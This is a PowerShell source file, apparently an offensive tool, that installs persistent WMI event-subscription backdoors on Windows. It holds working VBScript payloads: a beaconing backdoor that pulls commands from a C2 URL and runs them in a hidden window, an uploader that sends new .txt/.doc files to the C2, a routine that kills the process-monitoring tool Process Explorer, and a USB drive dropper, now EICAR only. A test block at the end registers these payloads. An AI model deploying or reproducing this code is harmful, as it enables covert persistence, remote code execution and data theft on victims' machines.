Function New-WMIBackdoorTrigger {
    Param (
        [Parameter(Mandatory = $True, ParameterSetName = 'Interval')]
        [UInt32]
        $TimingInterval,

        [Parameter(Mandatory = $True, ParameterSetName = 'AbsoluteDatetime')]
        [DateTime]
        $Datetime,

        [Parameter(ParameterSetName = 'Interval')]
        [Parameter(ParameterSetName = 'AbsoluteDatetime')]
        [ValidateNotNullOrEmpty()]
        [String]
        $TimerName = 'Timer',

        [Parameter(Mandatory = $True, ParameterSetName = 'ProcessStart')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ProcessName,

        [Parameter(Mandatory = $True, ParameterSetName = 'NewOrModifiedFile')]
        [ValidateScript({ foreach ($Ext in $_) {(!$Ext.Contains('.')) -and ($Ext.Length)} })]
        [String[]]
        $NewOrModifiedFileExtensions,

        [Parameter(Mandatory = $True, ParameterSetName = 'LockedScreen')]
        [Switch]
        $LockedScreen,

        [Parameter(Mandatory = $True, ParameterSetName = 'InteractiveLogon')]
        [Switch]
        $InteractiveLogon,

        [Parameter(Mandatory = $True, ParameterSetName = 'DriveInsertion')]
        [Switch]
        $DriveInsertion,

        [ValidateNotNullOrEmpty()]
        [String]
        $TriggerName
    )

    switch ($PsCmdlet.ParameterSetName) {
        'Interval' {
            if ($TriggerName) {
                $Name = $TriggerName
            } else {
                $Name = 'TimingIntervalTrigger'
            }

            # Convert minutes to milliseconds
            $IntervalMS = $TimingInterval * 60000

            $Result = @{
                Name = $Name
                EventNameSpace = 'ROOT\cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"
            }

            # Use $TimerName and $IntervalMS as out of band information to be used by Register-WMIBackdoor
            # This is kind of ugly but I wanted to maintain strict function separation for event triggers,
            # payloads, and registration.
            $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.TimingInterval.$TimerName.$IntervalMS")
            return $Result
        }

        'AbsoluteDatetime' {
            if ($TriggerName) {
                $Name = $TriggerName
            } else {
                $Name = 'DatetimeTrigger'
            }

            $DMTFTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime($Datetime).Replace('.','_')

            $Result = @{
                Name = $Name
                EventNameSpace = 'ROOT\cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"
            }

            $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.DateTime.$TimerName.$DMTFTime")
            return $Result
        }

        'ProcessStart' {
            if ($TriggerName) {
                $Name = $TriggerName
            } else {
                $Name = 'ProcessStartTrigger'
            }

            $Result = @{
                Name = $Name
                EventNameSpace = 'ROOT\cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = '$ProcessName'"
            }

            $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.ProcessStart")
            return $Result
        }

        'LockedScreen' {
            if ($TriggerName) {
                $Name = $TriggerName
            } else {
                $Name = 'LockedScreenTrigger'
            }

            $Result = @{
                Name = $Name
                EventNameSpace = 'ROOT\cimv2'
                QueryLanguage = 'WQL'
                Query = 'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = "LogonUI.exe"'
            }

            $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.LockedScreen")
            return $Result
        }

        'InteractiveLogon' {
            if ($TriggerName) {
                $Name = $TriggerName
            } else {
                $Name = 'InteractiveLogonTrigger'
            }

            $Result = @{
                Name = $Name
                EventNameSpace = 'ROOT\subscription'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
            }

            $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.InteractiveLogon")
            return $Result
        }

        'DriveInsertion' {
            if ($TriggerName) {
                $Name = $TriggerName
            } else {
                $Name = 'DriveInsertionTrigger'
            }

            $Result = @{
                Name = $Name
                EventNameSpace = 'ROOT\cimv2'
                QueryLanguage = 'WQL'
                Query = 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2'
            }

            $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.DriveInsertion")
            return $Result
        }

        'NewOrModifiedFile' {
            if ($TriggerName) {
                $Name = $TriggerName
            } else {
                $Name = 'NewOrModifiedFileTrigger'
            }

            $QueryExtensions = ($NewOrModifiedFileExtensions | % { "TargetInstance.Extension = `"$_`"" }) -join ' OR '

            $Result = @{
                Name = $Name
                EventNameSpace = 'ROOT\cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM __InstanceOperationEvent WITHIN 30 WHERE ((__CLASS = `"__InstanceCreationEvent`" OR __CLASS = `"__InstanceModificationEvent`") AND TargetInstance ISA `"CIM_DataFile`") AND ($QueryExtensions)"
            }

            $Result.PSObject.TypeNames.Insert(0, "WMI.BackdoorTrigger.NewOrModifiedFile")
            return $Result
        }
    }
}

Function New-WMIBackdoorAction {
    Param (
        [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')]
        [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')]
        [Uri]
        $C2Uri,

        [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')]
        [Switch]
        $Backdoor,

        [Parameter(Mandatory = $True, ParameterSetName = 'KillProcess')]
        [Switch]
        $KillProcess,

        [Parameter(Mandatory = $True, ParameterSetName = 'InfectDrive')]
        [Switch]
        $InfectDrive,
        
        [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')]
        [Switch]
        $FileUpload,

        [ValidateNotNullOrEmpty()]
        [String]
        $ActionName
    )

    $Base64Decoder = @'
        ' Decodes a base-64 encoded string (BSTR type).
        ' 1999 - 2004 Antonin Foller, http://www.motobit.com
        ' 1.01 - solves problem with Access And 'Compare Database' (InStr)
        Function Base64Decode(ByVal base64String)
            'rfc1521
            '1999 Antonin Foller, Motobit Software, http://Motobit.cz
            Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            Dim dataLength, sOut, groupBegin
  
            'remove white spaces, If any
            base64String = Replace(base64String, vbCrLf, "")
            base64String = Replace(base64String, vbTab, "")
            base64String = Replace(base64String, " ", "")
  
            'The source must consists from groups with Len of 4 chars
            dataLength = Len(base64String)
            If dataLength Mod 4 <> 0 Then
            Err.Raise 1, "Base64Decode", "Bad Base64 string."
            Exit Function
            End If

  
            ' Now decode each group:
            For groupBegin = 1 To dataLength Step 4
            Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
            ' Each data group encodes up To 3 actual bytes.
            numDataBytes = 3
            nGroup = 0

            For CharCounter = 0 To 3
                ' Convert each character into 6 bits of data, And add it To
                ' an integer For temporary storage.  If a character is a '=', there
                ' is one fewer data byte.  (There can only be a maximum of 2 '=' In
                ' the whole string.)

                thisChar = Mid(base64String, groupBegin + CharCounter, 1)

                If thisChar = "=" Then
                numDataBytes = numDataBytes - 1
                thisData = 0
                Else
                thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
                End If
                If thisData = -1 Then
                Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
                Exit Function
                End If

                nGroup = 64 * nGroup + thisData
            Next
    
            'Hex splits the long To 6 groups with 4 bits
            nGroup = Hex(nGroup)
    
            'Add leading zeros
            nGroup = String(6 - Len(nGroup), "0") & nGroup
    
            'Convert the 3 byte hex integer (6 chars) To 3 characters
            pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
                Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
                Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    
            'add numDataBytes characters To out string
            sOut = sOut & Left(pOut, numDataBytes)
            Next

            Base64Decode = sOut
        End Function
'@

    switch ($PsCmdlet.ParameterSetName) {
        'Backdoor' {
            $VBScript = @"
                Option Explicit
                On Error Resume Next

                Dim oXMLHTTP, oReg, aC2URL, aCmdType, aClassName, aPropertyName, aPayload, aMachineGuid

                Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
                oReg.GetStringValue &H80000002, "SOFTWARE\Microsoft\Cryptography", "MachineGuid", aMachineGuid

                aC2URL = "$($C2Uri.AbsoluteUri)index.html&ID=" & aMachineGuid

                Sub StorePayloadInWMIRepo(classname, propertyname, payload)
	                Dim oLocation, oServices, oDataObject
	
	                Set oLocation = CreateObject("WbemScripting.SWbemLocator")
	                Set oServices = oLocation.ConnectServer(, "root\cimv2")
	
	                Set oDataObject = oServices.Get
	                oDataObject.Path_.Class = classname
	                oDataObject.Properties_.Add(propertyname, 8).Value = payload
	                oDataObject.Put_
                End Sub

                Sub DeleteWMIClass(classname, propertyname)
                    Dim oLocation, oServices, oDataObject

                    Set oLocation = CreateObject("WbemScripting.SWbemLocator")
                    Set oServices = oLocation.ConnectServer(, "root\cimv2")
	
                    Set oDataObject = oServices.Get
                    oDataObject.Path_.Class = classname
                    oDataObject.Properties_.Add(propertyname, 8).Value = ""
                    oDataObject.Delete_()
                End Sub

                Sub ExecCommand(command)
	                Dim oLocation, oServices, oProcess, oStartup, oConfig, oResult, iProcessID

	                Const HIDDEN_WINDOW = 12
	                Set oLocation = CreateObject("WbemScripting.SWbemLocator")
	                Set oServices = oLocation.ConnectServer(, "root\cimv2")
	                Set oStartup = oServices.Get("Win32_ProcessStartup")
	                Set oConfig = oStartup.SpawnInstance_
	                oConfig.ShowWindow = HIDDEN_WINDOW
	                Set oProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
	                oResult = oProcess.Create(command, null, oConfig, iProcessID)
                End Sub

                $Base64Decoder

                Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
                oXMLHTTP.open "GET", aC2URL, False
                oXMLHTTP.send()

                If oXMLHTTP.Status = 200 Then
	                aCmdType = oXMLHTTP.getResponseHeader("Type")
	                aClassName = oXMLHTTP.getResponseHeader("Class")
	                aPropertyName = oXMLHTTP.getResponseHeader("Property")
	                aPayload = Base64Decode(oXMLHTTP.responseText)
	
	                Select Case aCmdType
		                Case "V"
			                If Not IsNull(aPayload) Then
				                Execute aPayload
			                End If
		                Case "P"
			                If Not IsNull(aClassName) And Not IsNull(aPropertyName) And Not IsNull(aPayload) Then
				                Call StorePayloadInWMIRepo(aClassName, aPropertyName, aPayload)
			                End If
                        Case "D"
                            If Not IsNull(aClassName) And Not IsNull(aPropertyName) Then
				                Call DeleteWMIClass(aClassName, aPropertyName)
			                End If
		                Case "C"
			                If Not IsNull(aPayload) Then
				                Call ExecCommand(aPayload)
			                End If
	                End Select
                End If

"@

            if ($ActionName) {
                $Name = $ActionName
            } else {
                $Name = 'LaunchBeaconingBackdoor'
            }
        }

        'KillProcess' {
            $VBScript = @"
                Dim oLocation, oServices, oProcessList, oProcess

	            Set oLocation = CreateObject("WbemScripting.SWbemLocator")
	            Set oServices = oLocation.ConnectServer(, "root\cimv2")
	            Set oProcessList = oServices.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessID = " & TargetEvent.ProcessID)
	            For Each oProcess in oProcessList
		            oProcess.Terminate()
	            Next
"@

            if ($ActionName) {
                $Name = $ActionName
            } else {
                $Name = 'KillProcess'
            }
        }

        'InfectDrive' {
            # This is only a PoC at this stage. This payload simply drops
            # the EICAR signature to <INSERTED_DRIVE_LETTER>:\eicar.txt

            $VBScript = @"
                Dim oFSO, oFile, sFilePath, sDecodedEicar

                $Base64Decoder

                sDecodedEicar = Base64Decode("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=")

                Set oFSO = CreateObject("Scripting.FileSystemObject")

                sFilePath = TargetEvent.DriveName & "\eicar.txt"
                Set oFile = oFSO.CreateTextFile(sFilePath, True)
                oFile.Write sDecodedEicar
                oFile.Close
"@

            if ($ActionName) {
                $Name = $ActionName
            } else {
                $Name = 'DriveInfector'
            }
        }

        'FileUpload' {
            $VBScript = @"
                On Error Resume Next

                Dim oReg, oXMLHTTP, oStream, aMachineGuid, aC2URL, vBinary

                Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
                oReg.GetStringValue &H80000002, "SOFTWARE\Microsoft\Cryptography", "MachineGuid", aMachineGuid

                aC2URL = "$($C2Uri.AbsoluteUri)index.html&ID=" & aMachineGuid

                Set oStream = CreateObject("ADODB.Stream")
                oStream.Type = 1
                oStream.Open
                oStream.LoadFromFile TargetEvent.TargetInstance.Name
                vBinary = oStream.Read

                Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
                oXMLHTTP.open "POST", aC2URL, False
                oXMLHTTP.setRequestHeader "Path", TargetEvent.TargetInstance.Name
                oXMLHTTP.send(vBinary)
"@

            if ($ActionName) {
                $Name = $ActionName
            } else {
                $Name = 'FileUpload'
            }
        }
    }

    $Action = @{
        Name = $Name
        ScriptingEngine = 'VBScript'
        ScriptText = $VBScript
        KillTimeout = [UInt32] 45
    }

    $Action.PSObject.TypeNames.Insert(0, 'WMI.BackdoorAction')
    return $Action
}

Function Register-WMIBackdoor {
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateScript({$_.PSObject.TypeNames[0].StartsWith('WMI.BackdoorTrigger')})]
        [Hashtable]
        $Trigger,

        [Parameter(Mandatory = $True)]
        [ValidateScript({$_.PSObject.TypeNames[0] -eq 'WMI.BackdoorAction'})]
        [Hashtable]
        $Action,

        [String]
        [ValidateNotNullOrEmpty()]
        [Alias('Cn')]
        $ComputerName = '.'
    )

    $TypeComponents = $Trigger.PSObject.TypeNames[0].Split('.')
    
    # Register the timer components if a time-based trigger was selected
    switch ($TypeComponents[2]) {
        'TimingInterval' {
            $TimerName = $TypeComponents[3]
            $TimingInterval = $TypeComponents[4]

            $TimerArg = @{
                IntervalBetweenEvents = ([UInt32] $TimingInterval)
                SkipIfPassed = $False
                TimerId = $TimerName
            }

            $Arguments = @{
                Namespace = 'ROOT\cimv2'
                Class = '__IntervalTimerInstruction'
                ComputerName = $ComputerName
                Arguments = $TimerArg
                ErrorAction = 'Stop'
            }

            $Timer = Set-WmiInstance @Arguments
        }

        'DateTime' {
            $TimerName = $TypeComponents[3]
            $DateTime = $TypeComponents[3].Replace('_', '.')

            $TimerArg = @{
                EventDateTime = $DateTime
                SkipIfPassed = $False
                TimerId = $TimerName
            }

            $Arguments = @{
                Namespace = 'ROOT\cimv2'
                Class = '__AbsoluteTimerInstruction'
                ComputerName = $ComputerName
                Arguments = $TimerArg
                ErrorAction = 'Stop'
            }

            $Timer = Set-WmiInstance @Arguments
        }
    }

    $FilterParams = @{
        Namespace = 'root\subscription'
        Class = '__EventFilter'
        ComputerName = $ComputerName
        Arguments = $Trigger
        ErrorAction = 'Stop'
    }

    $Filter = Set-WmiInstance @FilterParams

    $ConsumerParams = @{
        Namespace = 'root\subscription'
        Class = 'ActiveScriptEventConsumer'
        ComputerName = $ComputerName
        Arguments = $Action
        ErrorAction = 'Stop'
    }

    $Consumer = Set-WmiInstance @ConsumerParams

    $BindingParams = @{
        Namespace = 'root\subscription'
        Class = '__FilterToConsumerBinding'
        ComputerName = $ComputerName
        Arguments = @{ Filter = $Filter; Consumer = $Consumer }
        ErrorAction = 'Stop'
    }

    $FilterConsumerBinding = Set-WmiInstance @BindingParams

    $Result = New-Object PSObject -Property @{
        Filter = $Filter
        Consumer = $Consumer
        Binding = $FilterConsumerBinding
    }

    $Result.PSObject.TypeNames.Insert(0, 'WMI.BackdoorRegistration')
    return $Result
}

# Test WMI bindings

$Trigger1 = New-WMIBackdoorTrigger -NewOrModifiedFileExtensions 'txt', 'doc'
$Action1 = New-WMIBackdoorAction -C2Uri 'http://127.0.0.1' -FileUpload
$Registration1 = Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1

'foobar' | out-file C:\Users\Anonymous\Desktop\test.txt

$Trigger2 = New-WMIBackdoorTrigger -TimingInterval 1
$Action2 = New-WMIBackdoorAction -C2Uri 'http://127.0.0.1' -Backdoor
$Registration2 = Register-WMIBackdoor -Trigger $Trigger2 -Action $Action2

$Trigger3 = New-WMIBackdoorTrigger -ProcessName 'procexp64.exe'
$Action3 = New-WMIBackdoorAction -KillProcess
$Registration3 = Register-WMIBackdoor -Trigger $Trigger3 -Action $Action3

$Trigger4 = New-WMIBackdoorTrigger -DriveInsertion
$Action4 = New-WMIBackdoorAction -InfectDrive
$Registration4 = Register-WMIBackdoor -Trigger $Trigger4 -Action $Action4
